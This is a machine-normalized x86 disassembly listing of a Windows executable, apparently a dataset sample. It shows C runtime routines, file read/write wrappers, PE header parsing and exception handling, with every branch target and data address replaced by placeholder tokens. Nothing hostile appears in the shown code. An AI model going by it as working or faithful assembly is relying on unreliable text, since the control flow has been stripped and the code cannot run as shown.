sub_401000
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_401050
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push 0x0
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push ecx
push edx
push eax
mov [ ebp - 0x4 ] 0x0
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
or eax 0xffffffff
mov esp ebp
pop ebp
retn
sub_401085
mov edi edi
push ebp
mov ebp esp
push esi
call sub_406d2b
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_40b0dc
pop ecx
mov esi eax
call sub_40f84f
mov [ eax ] esi
pop esi
pop ebp
retn
sub_4010a8
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_4010d1
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
test ebx ebx
jne r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
call sub_40f84f
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov eax edx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov esi ecx
sub esi edx
mov esi edx
sub esi ecx
test ebx ebx
jne r-xdata
dec edi
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec ebx
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
movzx eax [ ecx ]
mov [ esi + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx ecx [ esi + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
mov [ edx ] ax
call sub_40f84f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ edx + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
call sub_40c515
mov eax esi
jmp r-xdata
sub_40119e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_407759
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
mov esi [ ebp - 0x10 ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
mov [ eax ] cl
test cl cl
jne r-xdata
dec eax
sub_401220
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_4013e2
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_408b16
pop ecx
sub_401250
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov esi ecx
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebx + 0x4 ]
mov eax [ ebx ]
mov edx ecx
sub edx eax
sar edx 0x2
push edi
mov edi [ esi ]
mov [ ebp - 0x4 ] edx
test edx edx
jne r-xdata
mov edx [ esi + 0x4 ]
sub edx edi
sar edx 0x2
cmp [ ebp - 0x4 ] edx
ja r-xdata
mov ecx [ esi + 0x4 ]
cmp edi ecx
je r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x2
cmp [ ebp - 0x4 ] ecx
ja r-xdata
sub ecx eax
sar ecx 0x2
add ecx ecx
add ecx ecx
push ecx
push eax
push edi
call sub_4138f0
mov eax [ ebx + 0x4 ]
sub eax [ ebx ]
mov ecx [ esi ]
add esp 0xc
sar eax 0x2
lea edx [ ecx + eax * 4 ]
pop edi
mov [ esi + 0x4 ] edx
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
pop edi
mov eax ecx
sub eax ecx
sar eax 0x2
lea ebx [ eax * 4 ]
push ebx
push ecx
push edi
call sub_4138f0
add esp 0xc
add ebx edi
pop edi
mov [ esi + 0x4 ] ebx
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
test eax eax
je r-xdata
lea edi [ eax + edx * 4 ]
mov edx edi
sub edx eax
sar edx 0x2
add edx edx
add edx edx
push edx
push eax
mov eax [ esi ]
push eax
call sub_4138f0
mov eax [ ebx + 0x4 ]
mov ecx [ esi + 0x4 ]
sub eax edi
sar eax 0x2
lea ebx [ eax * 4 ]
push ebx
push edi
push ecx
call sub_4138f0
add esp 0x18
add eax ebx
mov [ esi + 0x4 ] eax
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x4 ]
sub edi [ ebx ]
sar edi 0x2
call sub_401840
test al al
je r-xdata
push eax
call sub_408b16
add esp 0x4
mov eax [ esi ]
mov ecx [ ebx ]
push eax
mov eax [ ebx + 0x4 ]
call sub_40ca00
mov [ esi + 0x4 ] eax
sub_40136d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_40f84f
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
jmp r-xdata
test edi edi
je r-xdata
add edx 0x2
dec edi
jne r-xdata
sub edx ecx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_40f84f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ ecx ]
mov [ edx + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
call sub_40c515
mov eax esi
sub_40140f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
push [ eax ]
call sub_4068a2
mov eax esi
pop esi
pop ebp
retn 0x4
sub_401436
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_407759
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x80
lea eax [ ebp - 0x10 ]
push eax
push 0x80
push [ ebp + 0x8 ]
call sub_412f56
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_40149f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
push 0x104
mov esi rw-data
push esi
xor eax eax
xor ebx ebx
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
mov edi esi
mov edi eax
cmp [ eax ] bx
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0x8 ]
cmp ecx 0x7fffffff
jae r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ebx
lea ebx [ ebp - 0x8 ]
xor ecx ecx
mov eax edi
call sub_414049
mov ebx [ ebp - 0x4 ]
pop ecx
pop ecx
cmp ebx 0x3fffffff
jae r-xdata
lea eax [ ecx + ebx * 2 ]
add eax eax
add ecx ecx
cmp eax ecx
jb r-xdata
push eax
call sub_402a4b
mov esi eax
pop ecx
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ esi + ebx * 4 ]
push esi
lea ebx [ ebp - 0x8 ]
mov eax edi
call sub_414049
mov eax [ ebp - 0x4 ]
dec eax
pop ecx
mov [ rw-data ] eax
pop ecx
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_40154d
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_404ffb
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_402acd
sub_401580
push ebp
mov ebp esp
sub esp 0x10
push 0x18
call sub_4066cf
xor edx edx
add esp 0x4
cmp eax edx
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
call sub_40140f
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_4037cf
int3
mov ecx [ esi + 0x4 ]
mov [ eax ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x8 ] ecx
lea ecx [ eax + 0xc ]
mov [ eax + 0x14 ] dx
cmp ecx edx
je r-xdata
mov esp ebp
pop ebp
retn
mov edx [ edi ]
mov [ ecx ] edx
mov edx [ edi + 0x4 ]
mov [ ecx + 0x4 ] edx
sub_4015e5
push 0x14
push r--data
call sub_413ff0
or ebx 0xffffffff
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_406d2b
and [ eax ] 0x0
call sub_40f84f
mov [ eax ] 0x9
call sub_406d2b
and [ eax ] 0x0
call sub_40f84f
mov [ eax ] 0x9
call sub_40c515
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_414035
retn
mov eax ebx
mov edx ebx
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_40bc2e
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_40f84f
mov [ eax ] 0x9
call sub_406d2b
and [ eax ] 0x0
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401b7b
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4016c5
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_4016cf
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_407759
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x10 ]
push eax
push 0x8
push [ ebp + 0x8 ]
call sub_412f56
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_401720
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
push esi
mov esi [ rw-data ]
mov [ ebp - 0x4 ] 0x0
cmp esi eax
je r-xdata
mov edx [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push edx
push eax
push ecx
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov edi edi
or eax 0xffffffff
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
pop esi
mov esp ebp
pop ebp
retn
cmp esi eax
je r-xdata
add esi 0x8
cmp esi eax
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ rw-data ]
cmp eax ecx
jge r-xdata
cmp [ esi ] ecx
je r-xdata
push edi
mov edi [ ebp + 0x10 ]
lea edx [ eax + edi ]
cmp edx ecx
jb r-xdata
add eax [ rw-data ]
mov edx [ ebp + 0xc ]
push edi
push eax
push edx
call sub_415340
add esp 0xc
add [ esi + 0x4 ] edi
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub ecx eax
mov edi ecx
sub_4017b3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434352
je r-xdata
call sub_40c968
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_40c968
dec [ eax + 0x90 ]
cmp eax 0xe06d7363
jne r-xdata
call sub_40c968
and [ eax + 0x90 ] 0x0
jmp sub_407805
sub_401802
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_401840
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
cmp edi eax
jne r-xdata
cmp edi 0x3fffffff
jbe r-xdata
xor al al
retn
mov ecx edi
call sub_4027d0
mov [ esi ] eax
mov [ esi + 0x4 ] eax
lea eax [ eax + edi * 4 ]
mov [ esi + 0x8 ] eax
mov al 0x1
retn
push r--data
call sub_40458d
sub_401880
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] r--data
mov ecx [ eax + 0x4 ]
mov [ esi + 0x4 ] ecx
mov edx [ eax + 0x8 ]
mov eax edx
mov [ esi + 0x8 ] edx
mov [ esi + 0xc ] 0x0
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
push eax
call edx
sub_4018b9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_407805
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_4018fb
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_40440d
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_401940
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x7fffffff
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_40140f
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_4037cf
lea eax [ ecx + ecx ]
push eax
call sub_4066cf
add esp 0x4
test eax eax
jne r-xdata
sub_4019ad
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_402acd
int3
pop ebp
jmp eax
sub_4019da
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_407759
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4057cc
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_4109b8
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_401400
leave
retn
sub_401a90
push ebp
mov ebp esp
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
push ebx
push esi
mov ebx edx
jne r-xdata
cmp [ edx + 0x15 ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
push edi
mov edi [ esi ]
lea esp [ esp ]
mov ecx [ edx ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
cmp [ edx + 0x15 ] 0x0
je r-xdata
mov ecx [ ecx + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop esi
mov [ eax ] ebx
mov [ eax + 0x4 ] edx
pop ebx
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
mov esi [ eax ]
mov edi edi
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ebx ecx
mov ecx [ ecx ]
cmp edi esi
jge r-xdata
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov ecx [ ecx + 0x8 ]
mov edx ecx
mov ecx [ ecx ]
jmp r-xdata
mov esi [ ecx + 0xc ]
cmp esi edi
jge r-xdata
pop edi
mov edx ecx
cmp esi [ ecx + 0xc ]
jge r-xdata
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_401b12
mov edi edi
push esi
push 0x4
push 0x20
call sub_40a4e5
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_401b43
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp + 0x10 ]
push eax
push 0x0
push [ ebp + 0xc ]
push sub_408ea0
call sub_41387e
add esp 0x10
pop esi
pop ebp
retn
sub_401b7b
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_40ebf7
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_40f84f
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_401085
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_401c10
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_41113d
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_408b16
add esp 0x4
sub_401c40
push ebp
mov ebp esp
mov eax [ ecx + 0x8 ]
mov edx [ eax ]
mov [ ecx + 0x8 ] edx
mov edx [ eax ]
cmp [ edx + 0x31 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_401c9a
mov edi edi
push ebp
mov ebp esp
push esi
call sub_40c968
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_40c968
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_40c968
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_40ffac
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_401cf0
push esi
mov esi ecx
mov ecx eax
push edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
lea edi [ ecx + 0x1 ]
lea ebx [ ebx ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx edi
mov edi ecx
call sub_40d0c0
pop edi
mov eax esi
pop esi
retn
sub_401d37
push 0xc
push r--data
call sub_413ff0
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_40f84f
mov [ eax ] 0x16
call sub_40c515
or eax 0xffffffff
jmp r-xdata
push esi
call sub_40ee12
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_407290
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_401da3
jmp r-xdata
and [ esi + 0xc ] 0x0
call sub_414035
retn
mov eax [ ebp - 0x1c ]
sub_401dab
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_40cecc
push r--data
push r--data
call sub_410961
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_40ce10
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_40236a
call sub_40cafa
mov eax r--data
mov esi r--data
pop ecx
mov edi eax
cmp eax esi
jae r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_40ce10
pop ecx
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_401e50
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x3fffffff
jbe r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
sar eax 0x2
cmp eax ecx
jae r-xdata
push r--data
call sub_40458d
pop ebp
retn 0x4
push ebx
push edi
call sub_4027d0
mov ecx [ esi + 0x4 ]
mov ebx eax
mov eax [ esi ]
sub ecx eax
sar ecx 0x2
add ecx ecx
add ecx ecx
push ecx
push eax
push ebx
call sub_4138f0
mov eax [ esi ]
mov edi [ esi + 0x4 ]
sub edi eax
add esp 0xc
sar edi 0x2
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
lea ecx [ ebx + edi * 4 ]
lea eax [ ebx + edx * 4 ]
pop edi
mov [ esi ] ebx
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] ecx
pop ebx
push eax
call sub_408b16
add esp 0x4
sub_401ed0
push ebp
mov ebp esp
push 0xffffffff
push sub_41600b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0xc
call sub_4066cf
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
push edi
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x1
call [ SysAllocString@IAT ]
mov [ esi ] eax
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0x8007000e
call sub_40b3f0
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ eax ] esi
test esi esi
jne r-xdata
test edi edi
je r-xdata
push 0x8007000e
call sub_40b3f0
sub_401f65
push 0x8
push r--data
call sub_413ff0
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_4010a8
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_403728
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_40b241
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_414035
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_4010a8
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_403728
jmp r-xdata
sub_402000
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x15 ] 0x0
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_402000
mov esi [ esi ]
push edi
call sub_408b16
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov edi esi
je r-xdata
sub_402040
push ebp
mov ebp esp
push 0xffffffff
push sub_4160b0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
cmp ebx 0x1fffffff
jbe r-xdata
mov eax [ rw-data ]
sub eax [ rw-data ]
sar eax 0x3
cmp eax ebx
jae r-xdata
push r--data
call sub_40458d
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40a830
mov edi eax
mov [ ebp - 0x4 ] 0x0
mov edx [ rw-data ]
